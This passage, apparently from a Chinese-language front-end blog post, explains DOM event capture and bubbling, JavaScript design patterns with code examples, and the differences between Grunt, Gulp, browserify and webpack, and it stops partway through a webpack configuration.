<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div1 = <span class="built_in">document</span>.querySelector(<span class="string">'.div1'</span>)</span><br><span class="line"><span class="keyword">var</span> div2 = <span class="built_in">document</span>.querySelector(<span class="string">'.div2'</span>)</span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">'.btn'</span>)</span><br><span class="line"></span><br><span class="line">div1.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'div1'</span>)</span><br><span class="line">&#125;)</span><br><span class="line">div2.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'div2'</span>)</span><br><span class="line">&#125;)</span><br><span class="line">btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'btn'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>先后顺序是怎样的呢？</p>
<p>在js中，分为两个处理方法，捕获和冒泡。<br>如果是捕获（从外到内）：div1、div2、btn，第三个参数设置为true<br>如果是冒泡（从内到外）：btn、div2、div1，第三个参数设置为false（默认）</p>
<p><code>addEventListener</code> 和 <code>removeEventListener</code> 是否一定要成双成对出现？<br>当DOM元素与事件拥有不同的生命周期时，如果不调用remove，可能会造成内存泄漏（增加了不必要的内存占用）。比如在单页应用中，切换了页面，组件虽然被销毁，但是注册在document上的事件却被保留了下来，白白占用了内存空间。所以成对出现，是最佳实践。</p>
<hr>
<h2 id="js设计模式"><a href="#js设计模式" class="headerlink" title="js设计模式"></a>js设计模式</h2><blockquote>
<p>转载：<a href="https://segmentfault.com/a/1190000017787537" target="_blank" rel="noopener">segmentfault JavaScript中常用的设计模式</a></p>
</blockquote>
<table><tr><td>模式分类</td><td>名称</td></tr><tr><td rowspan="3">创建型</td><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">工厂模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">单例模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">原型模式</a></td></tr><tr><td rowspan="2">结构型</td><td><a href="https://github.com/sunzhaoye/blog/blob/masterdesignPattern/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">适配器模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">代理模式</a></td></tr><tr><td rowspan="5">行为型</td><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">策略模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">迭代器模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">观察者模式(发布-订阅模式)</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">命令模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">状态模式</a></td></tr></table>


<h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 工厂模式：创建对象时不会对客户端暴露创建逻辑，通过使用一个通用的接口来指向新创建的对象，用工厂方法代替new</span></span><br><span class="line"><span class="comment">// 构造函数和创建者分离，对new操作进行了封装</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Creator</span> </span>&#123;</span><br><span class="line">    create (name) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Animal(name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span> (name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> creator = <span class="keyword">new</span> Creator()  <span class="comment">// 此时不暴露创建逻辑</span></span><br><span class="line"><span class="comment">// 通过使用共同的create接口来指向新创建的对象</span></span><br><span class="line"><span class="keyword">var</span> duck = creator.create(<span class="string">'Duck'</span>)</span><br><span class="line"><span class="keyword">var</span> chicken = creator.create(<span class="string">'Chicken'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单例模式：一个类只能被实例化一次，提供一个访问类的全局访问点</span></span><br><span class="line"><span class="comment">// 实例如果已经创建，则直接返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用构造函数来判断</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Head</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> Head.instance === <span class="string">'object'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Head.instance</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建实例this</span></span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    Head.instance = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">return</span> Head.instance</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Head()</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Head()</span><br><span class="line"><span class="built_in">console</span>.log(a === b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用闭包来判断</span></span><br><span class="line"><span class="keyword">var</span> Head = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 内部申明一个HeadClass类，外部无法访问</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">HeadClass</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> instance = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance) &#123;</span><br><span class="line">            <span class="keyword">return</span> instance</span><br><span class="line">        &#125;</span><br><span class="line">        instance = <span class="keyword">new</span> HeadClass()</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Head(<span class="string">'A'</span>)</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Head(<span class="string">'B'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(a === b) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原型模式：使用现有的对象来提供新创建新的对象的__proto__，Object.create()</span></span><br><span class="line"><span class="keyword">var</span> prototype = &#123;</span><br><span class="line">    name: <span class="string">'Jack'</span>,</span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(prototype, &#123;</span><br><span class="line">    job: &#123;</span><br><span class="line">        value: <span class="string">'IT'</span></span><br><span class="line">    &#125;    </span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(obj.name, obj.job) <span class="comment">// Jack、IT</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.getName()) <span class="comment">// Jack</span></span><br><span class="line"><span class="built_in">console</span>.log(obj)</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  job: 'IT',</span></span><br><span class="line"><span class="comment">  __proto__: &#123;</span></span><br><span class="line"><span class="comment">    name: 'JACK',</span></span><br><span class="line"><span class="comment">    getName: function () &#123;</span></span><br><span class="line"><span class="comment">      return this.name</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="迭代器模式（遍历器模式）"><a href="#迭代器模式（遍历器模式）" class="headerlink" title="迭代器模式（遍历器模式）"></a>迭代器模式（遍历器模式）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 迭代器模式: 提供一种方法顺序的访问一个聚合对象中的各个元素</span></span><br><span class="line"><span class="comment">// 通过类创建</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Creator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span> (list) &#123;</span><br><span class="line">        <span class="keyword">this</span>.list = list</span><br><span class="line">    &#125;</span><br><span class="line">    createIterator () &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Iterator(<span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Iterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span> (creator) &#123;</span><br><span class="line">        <span class="keyword">this</span>.list = creator.list</span><br><span class="line">        <span class="keyword">this</span>.index = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    isDone () &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.index &gt;= <span class="keyword">this</span>.list.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    next () &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.list[<span class="keyword">this</span>.index++]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> creator = <span class="keyword">new</span> Creator([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="keyword">var</span> iterator = creator.createIterator()</span><br><span class="line"><span class="built_in">console</span>.log(creator.list)</span><br><span class="line"><span class="keyword">while</span> (!creator.isDone) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(iterator.next())</span><br><span class="line">    <span class="comment">// 1</span></span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">    <span class="comment">// 3</span></span><br><span class="line">    <span class="comment">// 4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过原型链创建</span></span><br><span class="line"><span class="keyword">const</span> colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>]</span><br><span class="line"><span class="built_in">Array</span>.prototype.values2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> items = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        next() &#123;</span><br><span class="line">            <span class="keyword">const</span> done = i &gt;= items.length;</span><br><span class="line">            <span class="keyword">const</span> value = done ? <span class="literal">undefined</span> : items[i++]</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                value,</span><br><span class="line">                done</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> iterator = colors.values2() <span class="comment">// Array Iterator &#123;&#125;</span></span><br><span class="line"><span class="comment">// 调用next()，返回相应的元素值，直到done为true</span></span><br><span class="line"><span class="built_in">console</span>.log(iterator.next()) <span class="comment">// &#123;value: "red", done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(iterator.next()) <span class="comment">// &#123;value: "green", done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(iterator.next()) <span class="comment">// &#123;value: "blue", done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(iterator.next()) <span class="comment">// &#123;value: undefined, done: true&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(iterator.next()) <span class="comment">// &#123;value: undefined, done: true&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6中的迭代器包括：Array、Symbol、Map、Set、NodeList、arguments、typeArray</span></span><br><span class="line"><span class="comment">// 以上有序数据集合都部署了Symbol.iterator属性，常见的包括obj[Symbol.iterator]()、obj.keys()、obj.values()、obj.entries()</span></span><br></pre></td></tr></table></figure>
<h3 id="观察者模式（发布-订阅模式）"><a href="#观察者模式（发布-订阅模式）" class="headerlink" title="观察者模式（发布-订阅模式）"></a>观察者模式（发布-订阅模式）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 观察者模式: 定义对象间的一对多关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Event</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.eventTypeObj = &#123;&#125;</span><br><span class="line">        <span class="keyword">this</span>.cacheObj = &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    on(eventType, fn) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.eventTypeObj[eventType]) &#123;</span><br><span class="line">            <span class="comment">// 按照不同的订阅事件类型，存储不同的订阅回调</span></span><br><span class="line">            <span class="keyword">this</span>.eventTypeObj[eventType] = []</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.eventTypeObj[eventType].push(fn)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是先发布，则在订阅者订阅后，则根据发布后缓存的事件类型和参数，执行订阅者的回调</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.cacheObj[eventType]) &#123;</span><br><span class="line">            <span class="keyword">var</span> cacheList = <span class="keyword">this</span>.cacheObj[eventType]</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cacheList.length; i++) &#123;</span><br><span class="line">                cacheList[i]()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    emit() &#123;</span><br><span class="line">        <span class="comment">// 可以理解为arguments借用shift方法</span></span><br><span class="line">        <span class="keyword">var</span> eventType = <span class="built_in">Array</span>.prototype.shift.call(<span class="built_in">arguments</span>)</span><br><span class="line">        <span class="keyword">var</span> args = <span class="built_in">arguments</span></span><br><span class="line">        <span class="keyword">var</span> that = <span class="keyword">this</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">cache</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (that.eventTypeObj[eventType]) &#123;</span><br><span class="line">                <span class="keyword">var</span> eventList = that.eventTypeObj[eventType]</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; eventList.length; i++) &#123;</span><br><span class="line">                    eventList[i].apply(eventList[i], args)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.cacheObj[eventType]) &#123;</span><br><span class="line">            <span class="keyword">this</span>.cacheObj[eventType] = []</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果先订阅，则直接订阅后发布</span></span><br><span class="line">        cache(args)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果先发布后订阅，则把发布的事件类型与参数保存起来，等到有订阅后执行订阅</span></span><br><span class="line">        <span class="keyword">this</span>.cacheObj[eventType].push(cache)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="gulp和grunt的不同"><a href="#gulp和grunt的不同" class="headerlink" title="gulp和grunt的不同"></a>gulp和grunt的不同</h2><blockquote>
<p>转载：<a href="https://www.jianshu.com/p/fe96491ccf56" target="_blank" rel="noopener">简书 如何看待 Grunt、Gulp 和 Webpack</a></p>
</blockquote>
<p>相信小伙伴们不仅听说过 <code>Gulp</code> 和 <code>webpack</code> ，还听说过 <code>Grunt</code>。一般都觉得他们都是打包工具，但其实还是有区别的 。更准确的讲，<code>Grunt</code> 和 <code>Gulp</code> 属于任务流工具<code>Tast Runner</code> , 而 webpack属于模块打包工具 <code>Bundler</code></p>
<ol>
<li><p>Tast Runner</p>
<ul>
<li><p>Grunt</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gruntfile.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">grunt</span>) </span>&#123;</span><br><span class="line">  grunt.initConfig(&#123;</span><br><span class="line">    <span class="comment">// js格式检查任务</span></span><br><span class="line">    jshint: &#123;</span><br><span class="line">      src: <span class="string">'src/test.js'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  代码压缩打包任务</span></span><br><span class="line">    uglify: &#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 导入任务插件</span></span><br><span class="line">  grunt.loadnpmTasks(<span class="string">'grunt-contrib-uglify'</span>);</span><br><span class="line">  <span class="comment">// 注册自定义任务, 如果有多个任务可以添加到数组中</span></span><br><span class="line">  grunt.regusterTask(<span class="string">'default'</span>, [<span class="string">'jshint'</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Gulp</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> jshint = <span class="built_in">require</span>(<span class="string">'gulp-jshint'</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码检查任务 gulp 采取了pipe 方法，用流的方法直接往下传递</span></span><br><span class="line">gulp.task(<span class="string">'lint'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'src/test.js'</span>)</span><br><span class="line">    .pipe(jshint())</span><br><span class="line">    .pipe(jshint.reporter(<span class="string">'default'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩代码任务</span></span><br><span class="line">gulp.task(<span class="string">'compress'</span>， <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'src/test.js'</span>)</span><br><span class="line">    .pipe(uglify())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'build'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将代码检查和压缩组合，新建一个任务</span></span><br><span class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'lint'</span>, <span class="string">'compress'</span>]);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Bundler</p>
<ul>
<li><p>browserify<br><code>browserify</code> 是早期的模块打包工具，是先驱者，踏实的浏览器端使用 <code>CommonJS</code> 规范（<code>require--module.export</code>）的格式组织代码成为可能。在这之前，因为 <code>CommonJS</code> 与浏览器特性的不兼容问题，更多使用的是 <code>AMD</code>（<code>defined--require</code>）规范，当然后来又发展了ES6模块规范（<code>require--export</code>）<br>假设有如下模块add.js 和 文件test.js，test.js 使用CommonJS规范导入了模块add.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="keyword">var</span> add = <span class="built_in">require</span>(<span class="string">'./add.js'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">1</span>, <span class="number">2</span>));  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>我们知道，如果直接执行是执行不成功的，因为浏览器无法识别 <code>CommonJS</code> 语法，而 <code>browserify</code> 就是用来处理这个问题的，他将 <code>CommonJS</code> 语法进行装换，在命令行执行功如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify test.js &gt; bundle.js</span><br></pre></td></tr></table></figure>
<p>生成的bundle.js就是已经处理完毕，可供浏览器执行使用的文件，只需要将它插入到 <code>&lt;script&gt;</code> 中即可。</p>
</li>
</ul>
</li>
</ol>
<ul>
<li><p>webpack<br><code>webpack</code> 是后起之秀，它支持了 <code>AMD</code> 和 <code>CommonJS</code> 类型，通过 <code>loader</code> 机制也可以使用ES6模块格式。还有强大的 <code>code splitting</code>。<code>webpack</code> 是个十分强大的工具，它正在想一个全能型的构建工具发展。<br>    <code>webpack</code> 通过配置文件 <code>webpack.config.js</code> 进行功能配置，一个配置案例如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span 